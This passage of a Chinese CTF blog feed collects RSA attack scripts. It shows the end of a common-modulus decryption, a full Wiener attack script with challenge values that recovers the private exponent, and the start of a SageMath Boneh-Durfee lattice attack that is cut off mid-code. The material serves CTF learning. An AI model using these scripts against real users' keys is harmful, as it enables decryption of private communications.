class="hljs-comment">#s和t中必然有一位负数，将其变为正数，要使等式仍然成立，取逆元</span><br><span class="hljs-keyword">if</span> s &lt; <span class="hljs-number">0</span>:<br>    s = -s<br>    c1 = gmpy2.invert(c1, n)<br><span class="hljs-keyword">if</span> t &lt; <span class="hljs-number">0</span>:<br>    t = -t<br>    c2 = gmpy2.invert(c2, n)<br>plain = gmpy2.powmod(c1, s, n) * gmpy2.powmod(c2, t, n) % n<br><span class="hljs-built_in">print</span>(long_to_bytes(plain))<br></code></pre></td></tr></table></figure><hr><h2 id="8、"><a href="#8、" class="headerlink" title="8、"></a>8、</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、Easy-RSA&quot;&gt;&lt;a href=&quot;#1、Easy-RSA&quot; class=&quot;headerlink&quot; title=&quot;1、Easy RSA&quot;&gt;&lt;/a&gt;1、Easy RSA&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>RSA脚本收集(不懂原理的那种)</title>
    <link href="https://zhangkaibin0921.github.io/2022/01/28/RSA%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86-%E4%B8%8D%E6%87%82%E5%8E%9F%E7%90%86%E7%9A%84%E9%82%A3%E7%A7%8D/"/>
    <id>https://zhangkaibin0921.github.io/2022/01/28/RSA%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86-%E4%B8%8D%E6%87%82%E5%8E%9F%E7%90%86%E7%9A%84%E9%82%A3%E7%A7%8D/</id>
    <published>2022-01-28T11:06:20.000Z</published>
    <updated>2022-02-19T06:40:02.539Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>脚本几乎都来自b站风二西，非常感谢</p></blockquote><h2 id="维纳攻击"><a href="#维纳攻击" class="headerlink" title="维纳攻击"></a>维纳攻击</h2><p>一般给出n、e、c<br>e指数很大</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">continuedFra</span>(<span class="hljs-params">x, y</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;计算连分数</span><br><span class="hljs-string">    :param x: 分子</span><br><span class="hljs-string">    :param y: 分母</span><br><span class="hljs-string">    :return: 连分数列表</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    cf = []<br>    <span class="hljs-keyword">while</span> y:<br>        cf.append(x // y)<br>        x, y = y, x % y<br>    <span class="hljs-keyword">return</span> cf<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gradualFra</span>(<span class="hljs-params">cf</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;计算传入列表最后的渐进分数</span><br><span class="hljs-string">    :param cf: 连分数列表</span><br><span class="hljs-string">    :return: 该列表最后的渐近分数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    numerator = <span class="hljs-number">0</span><br>    denominator = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cf[::-<span class="hljs-number">1</span>]:<br>        <span class="hljs-comment"># 这里的渐进分数分子分母要分开</span><br>        numerator, denominator = denominator, x * denominator + numerator<br>    <span class="hljs-keyword">return</span> numerator, denominator<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve_pq</span>(<span class="hljs-params">a, b, c</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;使用韦达定理解出pq，x^2−(p+q)∗x+pq=0</span><br><span class="hljs-string">    :param a:x^2的系数</span><br><span class="hljs-string">    :param b:x的系数</span><br><span class="hljs-string">    :param c:pq</span><br><span class="hljs-string">    :return:p，q</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    par = gmpy2.isqrt(b * b - <span class="hljs-number">4</span> * a * c)<br>    <span class="hljs-keyword">return</span> (-b + par) // (<span class="hljs-number">2</span> * a), (-b - par) // (<span class="hljs-number">2</span> * a)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getGradualFra</span>(<span class="hljs-params">cf</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;计算列表所有的渐近分数</span><br><span class="hljs-string">    :param cf: 连分数列表</span><br><span class="hljs-string">    :return: 该列表所有的渐近分数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    gf = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(cf) + <span class="hljs-number">1</span>):<br>        gf.append(gradualFra(cf[:i]))<br>    <span class="hljs-keyword">return</span> gf<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wienerAttack</span>(<span class="hljs-params">e, n</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    :param e:</span><br><span class="hljs-string">    :param n:</span><br><span class="hljs-string">    :return: 私钥d</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    cf = continuedFra(e, n)<br>    gf = getGradualFra(cf)<br>    <span class="hljs-keyword">for</span> d, k <span class="hljs-keyword">in</span> gf:<br>        <span class="hljs-keyword">if</span> k == <span class="hljs-number">0</span>: <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (e * d - <span class="hljs-number">1</span>) % k != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        phi = (e * d - <span class="hljs-number">1</span>) // k<br>        p, q = solve_pq(<span class="hljs-number">1</span>, n - phi + <span class="hljs-number">1</span>, n)<br>        <span class="hljs-keyword">if</span> p * q == n:<br>            <span class="hljs-keyword">return</span> d<br><br><br>n= <span class="hljs-number">68781015120012754009149819243839432182753699533745468739333557116438115901358573880902197723852823949505376140916570536753019491036629572363854637530919546688901226752085109196549145599781909847664046508960094447692268230516763088293911965638780888720788954194778424857089535187609738198309161969913567107861</span><br>e= <span class="hljs-number">54093680529782962282616750547542407544796590039913570980901028264103594185617926725669901283009540557359666956131385125727959502505561517117179644650419753631214251337533961664493198676862110639584202010794500844074619335752668896589407110076134931918634061631574656816488381501901503924226166074238518619869</span><br>c= <span class="hljs-number">30443384983816710270001651296607959522389400057103143909277631290995899073895621701281106228069835965181342091582584186637031613250922961166298411359757600825556083868477673357860585539016515776933117915504873987178857740106223631465737111746470236003857656528610755145017342412306680097140732745012583119076</span><br><br>d=wienerAttack(e, n)<br>m=<span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m).decode()) <br></code></pre></td></tr></table></figure><p><a href="https://www.bilibili.com/read/cv13393985">搬运来源</a></p><hr><h2 id="sage脚本-Boneh-Durfee-攻击"><a href="#sage脚本-Boneh-Durfee-攻击" class="headerlink" title="sage脚本_Boneh Durfee 攻击"></a>sage脚本_Boneh Durfee 攻击</h2><p>当用维纳攻击解不出来，可以用这个试试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Setting debug to true will display more informations</span><br><span class="hljs-string">about the lattice, the bounds, the vectors...</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>debug = <span class="hljs-literal">True</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Setting strict to true will stop the algorithm (and</span><br><span class="hljs-string">return (-1, -1)) if we don&#x27;t have a correct</span><br><span class="hljs-string">upperbound on the determinant. Note that this</span><br><span class="hljs-string">doesn&#x27;t necesseraly mean that no solutions</span><br><span class="hljs-string">will be found since the theoretical upperbound is</span><br><span class="hljs-string">usualy far away from actual results. That is why</span><br><span class="hljs-string">you should probably use `strict = False`</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>strict = <span class="hljs-literal">False</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">This is experimental, but has provided remarkable results</span><br><span class="hljs-string">so far. It tries to reduce the lattice as much as it can</span><br><span class="hljs-string">while keeping its efficiency. I see no reason not to use</span><br><span class="hljs-string">this option, but if things don&#x27;t work, you should try</span><br><span class="hljs-string">disabling it</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>helpful_only = <span class="hljs-literal">True</span><br>dimension_min = <span class="hljs-number">7</span> <span class="hljs-comment"># stop removing if lattice reaches that dimension</span><br><br><span class="hljs-comment">############################################</span><br><span class="hljs-comment"># Functions</span><br><span class="hljs-comment">##########################################</span><br><br><span class="hljs-comment"># display stats on helpful vectors</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">helpful_vectors</span>(<span class="hljs-params">BB, modulus</span>):</span><br>    nothelpful = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">0</span>]):<br>        <span class="hljs-keyword">if</span> BB[ii,ii] &gt;= modulus:<br>            nothelpful += <span class="hljs-number">1</span><br><br>    <span class="hljs-built_in">print</span> (nothelpful, <span class="hljs-string">&quot;/&quot;</span>, BB.dimensions()[<span class="hljs-number">0</span>], <span class="hljs-string">&quot; vectors are not helpful&quot;</span>)<br><br><span class="hljs-comment"># display matrix picture with 0 and X</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">matrix_overview</span>(<span class="hljs-params">BB, bound</span>):</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">0</span>]):<br>        a = (<span class="hljs-string">&#x27;%02d &#x27;</span> % ii)<br>        <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">1</span>]):<br>            a += <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">if</span> BB[ii,jj] == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;X&#x27;</span><br>            <span class="hljs-keyword">if</span> BB.dimensions()[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">60</span>:<br>                a += <span class="hljs-string">&#x27; &#x27;</span><br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= bound:<br>            a += <span class="hljs-string">&#x27;~&#x27;</span><br>        <span class="hljs-built_in">print</span> (a)<br><br><span class="hljs-comment"># tries to remove unhelpful vectors</span><br><span class="hljs-comment"># we start at current = n-1 (last vector)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove_unhelpful</span>(<span class="hljs-params">BB, monomials, bound, current</span>):</span><br>    <span class="hljs-comment"># end of our recursive function</span><br>    <span class="hljs-keyword">if</span> current == -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> BB.dimensions()[<span class="hljs-number">0</span>] &lt;= dimension_min:<br>        <span class="hljs-keyword">return</span> BB<br><br>    <span class="hljs-comment"># we start by checking from the end</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(current, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># if it is unhelpful:</span><br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= bound:<br>            affected_vectors = <span class="hljs-number">0</span><br>            affected_vector_index = <span class="hljs-number">0</span><br>            <span class="hljs-comment"># let&#x27;s check if it affects other vectors</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ii + <span class="hljs-number">1</span>, BB.dimensions()[<span class="hljs-number">0</span>]):<br>                <span class="hljs-comment"># if another vector is affected:</span><br>                <span class="hljs-comment"># we increase the count</span><br>                <span class="hljs-keyword">if</span> BB[jj, ii] != <span class="hljs-number">0</span>:<br>                    affected_vectors += <span class="hljs-number">1</span><br>                    affected_vector_index = jj<br><br>            <span class="hljs-comment"># level:0</span><br>            <span class="hljs-comment"># if no other vectors end up affected</span><br>            <span class="hljs-comment"># we remove it</span><br>            <span class="hljs-keyword">if</span> affected_vectors == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;* removing unhelpful vector&quot;</span>, ii)<br>                BB = BB.delete_columns([ii])<br>                BB = BB.delete_rows([ii])<br>                monomials.pop(ii)<br>                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">return</span> BB<br><br>            <span class="hljs-comment"># level:1</span><br>            <span class="hljs-comment"># if just one was affected we check</span><br>            <span class="hljs-comment"># if it is affecting someone else</span><br>            <span class="hljs-keyword">elif</span> affected_vectors == <span class="hljs-number">1</span>:<br>                affected_deeper = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(affected_vector_index + <span class="hljs-number">1</span>, BB.dimensions()[<span class="hljs-number">0</span>]):<br>                    <span class="hljs-comment"># if it is affecting even one vector</span><br>                    <span class="hljs-comment"># we give up on this one</span><br>                    <span class="hljs-keyword">if</span> BB[kk, affected_vector_index] != <span class="hljs-number">0</span>:<br>                        affected_deeper = <span class="hljs-literal">False</span><br>                <span class="hljs-comment"># remove both it if no other vector was affected and</span><br>                <span class="hljs-comment"># this helpful vector is not helpful enough</span><br>                <span class="hljs-comment"># compared to our unhelpful one</span><br>                <span class="hljs-keyword">if</span> affected_deeper <span class="hljs-keyword">and</span> <span class="hljs-built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="hljs-built_in">abs</span>(bound - BB[ii, ii]):<br>                    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="hljs-string">&quot;and&quot;</span>, affected_vector_index)<br>                    BB = BB.delete_columns([affected_vector_index, ii])<br>                    BB = BB.delete_rows([affected_vector_index, ii])<br>                    monomials.pop(affected_vector_index)<br>                    monomials.pop(ii)<br>                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="hljs-number">1</span>)<br>                    <span class="hljs-keyword">return</span> BB<br>    <span class="hljs-comment"># nothing happened</span><br>    <span class="hljs-keyword">return</span> BB<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Returns:</span><br><span class="hljs-string">* 0,0   if it fails</span><br><span class="hljs-string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span><br><span class="hljs-string">* x0,y0 the solutions of `pol`</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">boneh_durfee</span>(<span class="hljs-params">pol, modulus, mm, tt, XX, YY</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Boneh and Durfee revisited by Herrmann and May</span><br><span class="hljs-string"></span><br><span class="hljs-string">    finds a solution if:</span><br><span class="hljs-string">    * d &lt; N^delta</span><br><span class="hljs-string">    * |x| &lt; e^delta</span><br><span class="hljs-string">    * |y| &lt; e^0.5</span><br><span class="hljs-string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># substitution (Herrman and May)</span><br>    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)<br>    Q = PR.quotient(x*y + <span class="hljs-number">1</span> - u) <span class="hljs-comment"># u = xy + 1</span><br>    polZ = Q(pol).lift()<br><br>    UU = XX*YY + <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># x-shifts</span><br>    gg = []<br>    <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm - kk + <span class="hljs-number">1</span>):<br>            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk<br>            gg.append(xshift)<br>    gg.sort()<br><br>    <span class="hljs-comment"># x-shifts list of monomials</span><br>    monomials = []<br>    <span class="hljs-keyword">for</span> polynomial <span class="hljs-keyword">in</span> gg:<br>        <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> polynomial.monomials():<br>            <span class="hljs-keyword">if</span> monomial <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> monomials:<br>                monomials.append(monomial)<br>    monomials.sort()<br><br>    <span class="hljs-comment"># y-shifts (selected by Herrman and May)</span><br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, tt + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(floor(mm/tt) * jj, mm + <span class="hljs-number">1</span>):<br>            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)<br>            yshift = Q(yshift).lift()<br>            gg.append(yshift) <span class="hljs-comment"># substitution</span><br><br>    <span class="hljs-comment"># y-shifts list of monomials</span><br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, tt + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(floor(mm/tt) * jj, mm + <span class="hljs-number">1</span>):<br>            monomials.append(u^kk * y^jj)<br><br>    <span class="hljs-comment"># construct lattice B</span><br>    nn = <span class="hljs-built_in">len</span>(monomials)<br>    BB = Matrix(ZZ, nn)<br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn):<br>        BB[ii, <span class="hljs-number">0</span>] = gg[ii](<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, ii + <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> monomials[jj] <span class="hljs-keyword">in</span> gg[ii].monomials():<br>                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)<br><br>    <span class="hljs-comment"># Prototype to reduce the lattice</span><br>    <span class="hljs-keyword">if</span> helpful_only:<br>        <span class="hljs-comment"># automatically remove</span><br>        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># reset dimension</span><br>        nn = BB.dimensions()[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">if</span> nn == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;failure&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>,<span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># check if vectors are helpful</span><br>    <span class="hljs-keyword">if</span> debug:<br>        helpful_vectors(BB, modulus^mm)<br><br>    <span class="hljs-comment"># check if determinant is correctly bounded</span><br>    det = BB.det()<br>    bound = modulus^(mm*nn)<br>    <span class="hljs-keyword">if</span> det &gt;= bound:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Try with highers m and t.&quot;</span>)<br>        <span class="hljs-keyword">if</span> debug:<br>            diff = (log(det) - log(bound)) / log(<span class="hljs-number">2</span>)<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))<br>        <span class="hljs-keyword">if</span> strict:<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)<br><br>    <span class="hljs-comment"># display the lattice basis</span><br>    <span class="hljs-keyword">if</span> debug:<br>        matrix_overview(BB, modulus^mm)<br><br>    <span class="hljs-comment"># LLL</span><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)<br><br>    BB = BB.LLL()<br><br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;LLL is done!&quot;</span>)<br><br>    <span class="hljs-comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span><br>    <span 